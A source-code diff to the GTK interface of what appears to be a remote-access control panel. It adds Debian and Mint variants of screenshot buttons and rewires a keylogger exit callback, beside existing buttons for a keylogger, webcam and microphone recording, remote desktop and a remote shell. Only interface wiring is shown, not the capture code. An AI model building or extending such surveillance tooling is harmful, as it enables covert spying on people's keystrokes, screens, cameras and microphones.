@@ -171,8 +171,12 @@ void fill_window(int argc, char *argv[])
     GtkWidget *stream_webcam = NULL;
     GtkWidget *record_webcam = NULL;
     GtkWidget *record_micro = NULL;
-    GtkWidget *take_screenshot = NULL;
-    GtkWidget *multi_take_screenshot = NULL;
+
+    GtkWidget *take_screenshot_debian = NULL;
+    GtkWidget *take_screenshot_mint = NULL;
+
+    GtkWidget *multi_take_screenshot_debian = NULL;
+    GtkWidget *multi_take_screenshot_mint = NULL;
 
     char *IP = "";
 
@@ -363,7 +367,7 @@ void fill_window(int argc, char *argv[])
     exit_keylogger_button = gtk_button_new_with_label("Exit Keylogger");
     gtk_widget_set_size_request(exit_keylogger_button, 174, 34);
     gtk_fixed_put(GTK_FIXED(zone[0]), exit_keylogger_button, 38, 460);
-    g_signal_connect(G_OBJECT(exit_keylogger_button), "clicked", G_CALLBACK(cb_close_the_keylogger), NULL);
+    g_signal_connect(G_OBJECT(exit_keylogger_button), "clicked", G_CALLBACK(cb_exit_the_keylogger), NULL);
 
     run_keylogger = gtk_button_new_with_label("Ubuntu 24 Keylogger");
     gtk_widget_set_size_request(run_keylogger, 174, 34);
@@ -433,7 +437,7 @@ void fill_window(int argc, char *argv[])
     gtk_frame_set_label(GTK_FRAME(frame[5]), "                                             ");
     gtk_frame_set_label_align(GTK_FRAME(frame[5]), (gfloat)0.05, (gfloat)0.5);
     gtk_frame_set_shadow_type(GTK_FRAME(frame[5]), GTK_SHADOW_OUT);
-    gtk_widget_set_usize(frame[5], 260, 340);
+    gtk_widget_set_usize(frame[5], 260, 440);
     gtk_fixed_put(GTK_FIXED(zone[0]), frame[5], 750, 10);
 
     remote_desktop = gtk_button_new_with_label("Stream Remote Desktop.");
@@ -456,15 +460,25 @@ void fill_window(int argc, char *argv[])
     gtk_fixed_put(GTK_FIXED(zone[0]), record_micro, 780, 200);
     g_signal_connect(G_OBJECT(record_micro), "clicked", G_CALLBACK(cb_record_micro), NULL);
 
-    take_screenshot = gtk_button_new_with_label("Take Screenshot");
-    gtk_widget_set_size_request(take_screenshot, 200, 30);
-    gtk_fixed_put(GTK_FIXED(zone[0]), take_screenshot, 780, 250);
-    g_signal_connect(G_OBJECT(take_screenshot), "clicked", G_CALLBACK(cb_take_screenshot), NULL);
+    take_screenshot_debian = gtk_button_new_with_label("Take Screenshot Debian");
+    gtk_widget_set_size_request(take_screenshot_debian, 200, 30);
+    gtk_fixed_put(GTK_FIXED(zone[0]), take_screenshot_debian, 780, 250);
+    g_signal_connect(G_OBJECT(take_screenshot_debian), "clicked", G_CALLBACK(cb_take_screenshot_debian), NULL);
 
-    multi_take_screenshot = gtk_button_new_with_label("Take Multi Screenshots");
-    gtk_widget_set_size_request(multi_take_screenshot, 200, 30);
-    gtk_fixed_put(GTK_FIXED(zone[0]), multi_take_screenshot, 780, 300);
-    g_signal_connect(G_OBJECT(multi_take_screenshot), "clicked", G_CALLBACK(cb_multi_screenshot), NULL);
+    take_screenshot_mint = gtk_button_new_with_label("Take Screenshot Mint");
+    gtk_widget_set_size_request(take_screenshot_mint, 200, 30);
+    gtk_fixed_put(GTK_FIXED(zone[0]), take_screenshot_mint, 780, 300);
+    g_signal_connect(G_OBJECT(take_screenshot_mint), "clicked", G_CALLBACK(cb_take_screenshot_mint), NULL);
+
+    multi_take_screenshot_debian = gtk_button_new_with_label("Take Multi Screenshots Debian");
+    gtk_widget_set_size_request(multi_take_screenshot_debian, 220, 30);
+    gtk_fixed_put(GTK_FIXED(zone[0]), multi_take_screenshot_debian, 780, 350);
+    g_signal_connect(G_OBJECT(multi_take_screenshot_debian), "clicked", G_CALLBACK(cb_multi_screenshot_debian), NULL);
+
+    multi_take_screenshot_mint = gtk_button_new_with_label("Take Multi Screenshots Mint");
+    gtk_widget_set_size_request(multi_take_screenshot_mint, 220, 30);
+    gtk_fixed_put(GTK_FIXED(zone[0]), multi_take_screenshot_mint, 780, 400);
+    g_signal_connect(G_OBJECT(multi_take_screenshot_mint), "clicked", G_CALLBACK(cb_multi_screenshot_mint), NULL);
 
     /** TAB : Remote Shell **/
     /** Frame 6 : Remote Shell Start / Command / Send) **/
